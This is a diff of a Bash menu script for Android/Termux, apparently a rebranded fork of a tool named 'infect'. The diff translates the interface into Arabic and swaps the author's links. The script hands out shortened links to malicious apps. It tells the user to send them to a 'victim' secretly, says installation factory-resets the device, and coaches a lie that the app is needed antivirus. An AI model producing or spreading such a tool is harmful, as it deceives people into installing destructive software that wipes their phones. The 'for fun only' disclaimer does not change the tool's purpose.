@@ -1,4 +1,4 @@
-# A tool by nitro from www.noob-hackers.com
+# A tool by nitro from https://t.me/omarproxt25
 # Be a unique person not copy cat
 # Colours
 #-----------------
@@ -79,14 +79,14 @@ menu(){
 echo -e "$grn             ＞＞＞＞>>>＞$ylo [Options]$grn ＜<<<＜＜＜＜$rset"
 echo " "
 echo " "
-echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Infect now"
-echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Save now"
-echo -e "$red                        ➡$cyan [\e[92m3\e[96m] About"
-echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Update script "
-echo -e "$red                        ➡$cyan [\e[92m5\e[96m] Subscribe"
-echo -e "$red                        ➡$cyan [\e[92m6\e[96m] More"
-echo -e "$red                        ➡$cyan [\e[92m7\e[96m] Chat"
-echo -e "$red                        ➡$cyan [\e[92m8\e[96m] Exit"
+echo -e "$red                        ➡$cyan [\e[92m1\e[96m] تصيب الآن"
+echo -e "$red                        ➡$cyan [\e[92m2\e[96m] احفظ الان"
+echo -e "$red                        ➡$cyan [\e[92m3\e[96m] عن"
+echo -e "$red                        ➡$cyan [\e[92m4\e[96m] تحديث السكربت "
+echo -e "$red                        ➡$cyan [\e[92m5\e[96m] الإشتراك"
+echo -e "$red                        ➡$cyan [\e[92m6\e[96m] أكثر"
+echo -e "$red                        ➡$cyan [\e[92m7\e[96m] دردشة"
+echo -e "$red                        ➡$cyan [\e[92m8\e[96m] مخرج"
 echo " "
 echo " "
 echo -e "$grn               >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
@@ -107,17 +107,17 @@ then
 upd
 elif [ $optnz = "5" ];
 then
-am start -a android.intent.action.VIEW -d https://bitly.com/nhytchannel > /dev/null 2>&1
+am start -a android.intent.action.VIEW -d https://www.youtube.com/@omarproxt > /dev/null 2>&1
 banner
 menu
 elif [ $optnz = "6" ];
 then
-am start -a android.intent.action.VIEW -d https://noob-hackers.github.io/noobspage > /dev/null 2>&1
+am start -a android.intent.action.VIEW -d https://github.com/omarproxt > /dev/null 2>&1
 banner
 menu
 elif [ $optnz = "7" ];
 then
-am start -a android.intent.action.VIEW -d https://bit.ly/nhwhatschat > /dev/null 2>&1
+am start -a android.intent.action.VIEW -d https://t.me/omarproxt25 > /dev/null 2>&1
 banner
 menu
 elif [ $optnz = "8" ];
@@ -138,17 +138,17 @@ echo -e '\e[92m
                     )  (  )(_)(   )(   )__) 
                    (_)\_)(_____) (__) (____) '
 echo " "
-echo -e "\e[91m 😈  Copy below link and send it your victim and 
-say nothing to him. when he install it in his 
-device it will be factory reset and lot more happens.
+echo -e "\e[91m 😈  انسخ الرابط أدناه وأرسله إلى ضحيتك و
+لا تقل له شيئا. عندما يقوم بتثبيته في ملفه
+الجهاز سيتم إعادة ضبط المصنع وسيحدث الكثير.
                                 👇👇👇
 
          \e[92mL1NK :- \e[96mhttps://tinyurl.com/uppdatesnew\e[91m
 
                                  👆👆👆
-Use only for fun purpose not for harming someone 😇✌️.
-And our channel is not responsible for any kind of loss 
-you do to other's by this script."
+استخدم فقط لغرض المتعة وليس لإيذاء شخص ما.
+وقناتنا ليست مسؤولة عن أي نوع من الخسارة
+أنت تفعل للآخرين من خلال هذا البرنامج النصي."
 echo
 echo -ne "\e[92m#Type exit : "
 read exitz
@@ -171,17 +171,17 @@ echo -e '\e[92m
                    (_)\_)(_____) (__) (____) '
 echo " "
 echo " "
-echo -e "\e[93m  Copy below link and send it your victim and tell him
-that he should install this application or else his 
-device will not be recovered.(Antivirus)
+echo -e "\e[93m  انسخ الرابط أدناه وأرسله إلى ضحيتك وأخبره
+أنه يجب عليه تثبيت هذا التطبيق أو غير ذلك
+لن يتم استرداد الجهاز. (مكافحة الفيروسات)
                     👇👇👇
 
         \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
 
                     👆👆👆
-Use only for fun purpose not for harming someone 😇✌️. 
-And our channel is not responsible for any kind of 
-loss you do to other's by this script."
+استخدم فقط لغرض المتعة وليس لإيذاء شخص ما.
+وقناتنا ليست مسؤولة عن أي نوع من الخسارة
+أنت تفعل للآخرين من خلال هذا البرنامج النصي."
 echo
 echo -ne "\e[92m#Type exit : "
 read exitz
@@ -237,7 +237,7 @@ echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
 echo
 printf "                     \e[96m["
 # While process is running...
-while git clone https://github.com/noob-hackers/infect 2> /dev/null; do 
+while git clone https://github.com/omarproxt/infect 2> /dev/null; do 
     printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
     sleep 1
 done
@@ -275,7 +275,7 @@ echo -en "\e[32mSELECT OPTION [\e[93my/\e[93mt/\e[32m\e[93mz\e[32m]: \e[0m "
 read p
 if [ "$p" = "y" ];
 then
-am start -a android.intent.action.VIEW -d https://noobhacktube.com 2>/dev/null
+am start -a android.intent.action.VIEW -d https://t.me/omarproxt25
 clear
 baner1
 menu
